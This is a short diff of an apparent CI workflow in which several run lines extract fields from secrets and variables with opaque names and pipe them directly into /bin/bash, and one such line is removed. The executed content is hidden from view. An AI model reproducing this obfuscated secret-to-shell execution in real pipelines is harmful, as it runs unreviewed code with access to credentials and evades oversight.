@@ -19,7 +19,6 @@ jobs:
           javvn184: ${{ secrets.javvn184 }}
         run: |
           printf '%s' "$javvn184" | jq -r .jlrg663 | /bin/bash
-          echo $v4 | jq -r .gdwt54430 | /bin/bash
           echo $cop10 | jq -r .fgsv9427 | /bin/bash
           echo $pm94 | jq -r .vqncs8946 | /bin/bash
           printf '%s' "$nvc165" | jq -r .p936 | /bin/bash
